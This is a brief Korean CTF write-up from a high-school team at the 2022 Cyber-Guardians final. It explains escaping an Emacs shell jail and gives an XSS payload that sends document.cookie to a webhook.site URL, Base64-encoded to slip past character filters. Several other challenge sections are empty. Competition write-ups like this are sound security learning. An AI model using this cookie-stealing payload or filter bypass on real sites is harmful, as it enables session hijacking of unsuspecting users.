# 2022 Cyber-Guardians CTF Final

## Dreamhack Profile
School: 덕영고등학교

Team: Asseertive

## Solve list
A - Sanity Check Revenge (@suk-6)

D - xss-1.3 (@suk-6)

E - CProxy: Inject (@fixca)

K - Simple Factor (@suk-6)

M - xss-1.5 (@suk-6)

### Sanity Check Revenge
문제 ssh에 접속하면 GNU Emacs 편집기가 나온다.

ESC + !로 Shell Command 입력창을 불러와서 루트 폴더의 flag 파일을 읽는다.

### xss-1.3
xss-1.3은 문제에서 말하고 있듯 xss 문제이다.

`'`, `"`, `=`를 필터링하고 있다.

필터링을 우회하기 위해 Base64 인코딩으로 해결하였다.

```
<svg/onload=location.href=`https://webhook.site/webhook-id?flag=`.concat(document.cookie)>

to base64(URL-safe) + JS Decoding Code

<script>document.write(atob(`PHN2Zy9vbmxvYWQ9bG9jYXRpb24uaHJlZj1gaHR0cHM6Ly93ZWJob29rLnNpdGUvd2ViaG9vay1pZD9mbGFnPWAuY29uY2F0KGRvY3VtZW50LmNvb2tpZSk-`))</script>
```

### CProxy: Inject

### Simple Factor

### xss-1.5